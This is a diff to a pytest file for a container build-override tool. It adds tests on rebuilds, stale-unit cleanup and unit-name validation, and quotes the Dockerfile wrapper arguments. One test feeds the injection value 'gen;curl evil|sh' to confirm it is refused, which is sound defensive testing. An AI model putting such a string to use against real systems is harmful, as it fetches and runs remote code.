@@ -291,6 +291,39 @@ def test_forgetting_a_build_removes_its_artifacts(tmp_path):
     assert overrides.forget("gen") == []
 
 
+def test_rebuilding_makes_every_container_take_the_new_build(tmp_path):
+    write_unit(tmp_path, "gen", GEN_IMAKE)
+    unit = find_unit(tmp_path)
+    artifact = tmp_path / "gen"
+    artifact.write_text("v1")
+    overrides = Overrides("image-id")
+    overrides.record(unit, artifact, None)
+    overrides.mark_applied("container-1")
+
+    artifact.write_text("v2")
+    overrides.record(unit, artifact, None)
+
+    assert not overrides.applied("container-1")
+
+
+def test_cleaning_everything_also_drops_units_of_other_images(tmp_path):
+    write_unit(tmp_path, "gen", GEN_IMAKE)
+    unit = find_unit(tmp_path)
+    artifact = tmp_path / "gen"
+    artifact.write_text("binary")
+    Overrides("sha256:oldimage0000").record(unit, artifact, None)
+
+    assert build_module.forget_stale("sha256:newimage0000") == ["gen"]
+    assert stale_units("sha256:newimage0000") == []
+
+
+def test_a_unit_name_that_is_not_a_program_name_is_refused(tmp_path):
+    write_unit(tmp_path, "gen", GEN_IMAKE)
+
+    with pytest.raises(TigError, match="not a valid VICAR unit name"):
+        find_unit(tmp_path, "gen;curl evil|sh")
+
+
 def test_builds_against_another_image_are_reported_as_stale(tmp_path):
     write_unit(tmp_path, "gen", GEN_IMAKE)
     unit = find_unit(tmp_path)
@@ -392,7 +425,7 @@ def test_image_mode_adds_one_layer_over_the_runtime_image(tmp_path):
     assert f"COPY gen {unit.container_path}" in seen["dockerfile"]
     assert f"COPY gen.pdf {unit.container_path}.pdf" in seen["dockerfile"]
     # A program the image lacks needs its /usr/local/bin wrapper too.
-    assert f"RUN sh /tmp/tig-gen-wrapper.sh gen {unit.container_lib_dir}" in (
+    assert f"RUN sh /tmp/tig-gen-wrapper.sh 'gen' '{unit.container_lib_dir}'" in (
         seen["dockerfile"]
     )
 
